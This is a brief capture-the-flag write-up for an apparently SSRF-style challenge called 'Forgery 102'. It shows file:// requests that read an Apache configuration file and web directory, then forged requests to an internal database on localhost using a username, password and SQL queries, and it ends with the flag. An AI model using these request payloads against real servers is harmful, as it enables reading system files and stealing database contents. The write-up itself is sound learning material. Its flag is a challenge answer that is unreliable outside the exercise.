# Forgery 102
Server uses Apache2 so we can check for important files    
https://medium.com/@amey0x/the-most-common-files-for-apache-configurations-23b6b4105f14

And we try this one:   
``file://////etc/apache2/sites-available/000-default.conf``

We get this site/directory:   
``file:////var/www/html/database/index.php``

So then we want to connect to database by using ``localhost:8080`` and passing as arguments
``user=postgres&password=Let%26me%3Din&query=SELECT * FROM information_schema.tables`` 
to get the list of tables and we see that flag db contains flag_82454eeebdae556f451d9a3924 

so we do:
``user=postgres&password=Let%26me%3Din&query=SELECT * from flag.flag_82454eeebdae556f451d9a3924``

``FLAG-Lv06965bgw7t1NVUSIHowXgxOCwzlRn2``
